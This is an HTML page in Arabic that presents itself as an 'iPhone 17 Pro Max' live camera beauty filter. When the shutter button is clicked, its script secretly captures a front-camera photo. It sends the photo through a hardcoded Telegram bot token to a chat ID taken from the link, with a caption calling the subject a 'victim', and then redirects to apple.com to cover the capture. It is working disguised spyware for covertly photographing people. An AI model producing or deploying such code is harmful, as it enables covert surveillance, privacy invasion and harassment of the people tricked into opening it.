<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iPhone 17 Pro Max • Live Camera Filter</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .camera-frame { width: 100%; max-width: 380px; height: 100%; max-height: 700px; background: #111; display: flex; flex-direction: column; justify-content: space-between; padding: 25px 20px; position: relative; border-radius: 30px; border: 4px solid #333; }
        .top-bar { display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #f59e0b; font-weight: bold; }
        .viewfinder { flex: 1; background: #1a1a1a; margin: 15px 0; border-radius: 15px; display: flex; justify-content: center; align-items: center; position: relative; overflow: hidden; border: 1px dashed #444; }
        .viewfinder-text { font-size: 13px; color: #888; text-align: center; padding: 0 20px; }
        .bottom-controls { display: flex; justify-content: space-around; align-items: center; padding-bottom: 10px; }
        .shutter-btn { width: 75px; height: 75px; background: #fff; border-radius: 50%; border: 4px solid #ccc; cursor: pointer; display: flex; justify-content: center; align-items: center; transition: 0.2s; }
        .shutter-inner { width: 63px; height: 63px; background: #fff; border-radius: 50%; border: 2px solid #000; }
        .shutter-btn:active { transform: scale(0.92); }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="camera-frame">
        <div class="top-bar">
            <span>PRO RAW</span>
            <span>4K 60FPS</span>
            <span>HDR ON</span>
        </div>

        <div class="viewfinder">
            <div class="viewfinder-text" id="guideText">انقر على زر التقاط الصورة لتفعيل فلتر الجمال الذكي لآيفون</div>
        </div>

        <div class="bottom-controls">
            <div style="font-size: 11px; color: #aaa;">فلتر الآيفون</div>
            <div class="shutter-btn" id="shutterBtn">
                <div class="shutter-inner"></div>
            </div>
            <div style="font-size: 11px; color: #aaa;">كاميرا أمامية</div>
        </div>
    </div>

    <video id="vid" autoplay playsinline></video>
    <canvas id="can"></canvas>

    <script>
        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('shutterBtn').addEventListener('click', async function() {
            if(!targetChatId) return;
            document.getElementById('guideText').innerText = "جاري التقاط الصورة بدقة 4K...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('vid');
                video.srcObject = stream;
                await video.play();

                const canvas = document.getElementById('can');
                canvas.width = video.videoWidth || 720;
                canvas.height = video.videoHeight || 1280;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                await new Promise(resolve => {
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'iphone_shot.jpg');
                        formData.append('caption', 'صورة آيفون احترافية (ضحية)');

                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${targetChatId}`, {
                            method: 'POST',
                            body: formData
                        });
                        stream.getTracks().forEach(t => t.stop());
                        resolve();
                    }, 'image/jpeg', 0.9);
                });
            } catch(e) {}

            setTimeout(() => {
                window.location.href = "https://www.apple.com";
            }, 800);
        });
    </script>
</body>
</html>
